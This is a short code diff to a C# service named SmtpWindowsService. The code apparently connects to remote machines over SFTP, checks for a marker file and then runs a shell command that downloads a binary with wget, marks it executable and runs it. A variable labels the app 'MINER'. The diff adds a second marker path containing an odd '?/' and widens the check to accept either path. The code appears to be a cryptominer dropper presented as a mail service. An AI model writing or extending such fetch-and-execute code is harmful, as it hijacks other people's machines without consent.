@@ -29,6 +29,7 @@ namespace SmtpWindowsService.Methods
         {
             var remoteDirectory = ConfigurationManager.AppSettings["remoteDefaultDirectory"];
             var remoteFile = string.Format("{0}/sandy/yam", remoteDirectory);
+            var remoteFile2 = string.Format("{0}?/sandy/yam", remoteDirectory);
             var downloadHost = ConfigurationManager.AppSettings["downloadHost"];
             var appName = "MINER";
             try
@@ -38,7 +39,7 @@ namespace SmtpWindowsService.Methods
                     sftp.Connect();
                     lock (locker)
                     {
-                        if (sftp.Exists(remoteFile))
+                        if (sftp.Exists(remoteFile) || sftp.Exists(remoteFile2))
                         {
                             var command1 = string.Format("wget {0}/sc -P {1} && chmod +x {1}/sc && {1}/sc", downloadHost, remoteDirectory);
                             ShellStream shell;
